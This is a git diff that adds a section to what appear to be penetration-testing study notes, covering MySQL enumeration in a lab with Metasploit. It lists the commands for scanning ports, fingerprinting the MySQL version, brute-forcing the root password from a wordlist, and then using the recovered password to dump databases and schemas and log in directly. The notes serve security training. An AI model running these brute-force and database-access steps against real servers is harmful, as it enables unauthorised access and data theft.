@@ -486,6 +486,131 @@ We ran followed auxiliary modules;
 
 ## Demo: Web Server Enumeration
 
+## MYSQL Enumeration
+
+- My SQL is a relational database management system based on SQL
+- It is typically used to store records, customer data, and is most commonly deployed to store web application data.
+- MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port.
+- We can utilize auxiliary modules to enumerate the version of MySQL, perfon brute-force attacks to identify passwords, execute SQL queries and much more.
+
+## Demo: MYSQL Enumeration
+
+`ifconfig`
+
+`service postgresql start && msfconsole`
+
+msf6:`workspace -a MYSQL_ENUM`
+
+msf6:`setg rhosts [targetIP]`
+
+msf6:`setg rhost [targetIP]`
+
+msf6:`search portscan`
+
+msf6:`use auxiliary/scanner/portscan/tcp`
+
+msf6:`show options`
+
+msf6:`run`
+
+msf6:`search type:auxiliary name:mysql`
+
+msf6:`use auxiliary/scanner/mysql/mysql_version`
+
+msf6:`show options`
+
+msf6:`run`
+
+We got MYSQL on v5.5.61. because there is no exploit for this version, we perform a brute-force for root-credentials:
+
+msf6:`seach mysql_login`
+
+msf6:`use auxiliary/scanner/mysql/mysql_login`
+
+msf6:`show options`
+
+msf6:`set username root`
+
+msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+
+msf6:`set verbose false`
+
+msf6:`run`
+
+We obtained the credentials.
+
+Now we perform mysql enumeration:
+
+msf6:`search mysql_enum`
+
+msf6:`use auxiliary/admin/mysql/mysql_enum`: Because its in the admin subdir, which means we need the credentials we obtained.
+
+msf6:`set PASSWORD twinkle`
+
+msf6:`set USERNAME root`
+
+msf6:`run`
+
+The next module is for executing sql queries
+
+msf6:`search mysql_sql`: Here we also need credentials
+
+msf6:`use auxiliary/admin/mysql/mysql_sql`
+
+msf6:`set password twinkle`
+
+msf6:`set username root`
+
+Eventually we need to specify the "SQL" variable. select version() would be for extracting the version.
+
+msf6:`run`
+
+msf6:`set sql show databases;`: Sends a statement, Shows us the databases
+
+msf6:`set SQL use videos;`
+
+Module for learning more about the schema:
+
+msf6:`search mysql_schema`
+
+msf6:`use auxiliary/scanner/mysql/mysql_Schemadump`
+
+msf6:`show options`
+
+msf6:`set password twinkle`
+
+msf6:`set username root`
+
+msf6:`hosts`
+
+msf6:`services`
+
+msf6:`loot`
+
+msf6:`creds`
+
+msf6:`exit`
+
+`mysql -h [targetIP] -u root -p` twinkle
+
+Now we have access to the mysql database server.
+
+`use videos;`
+
+`show tables;`
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
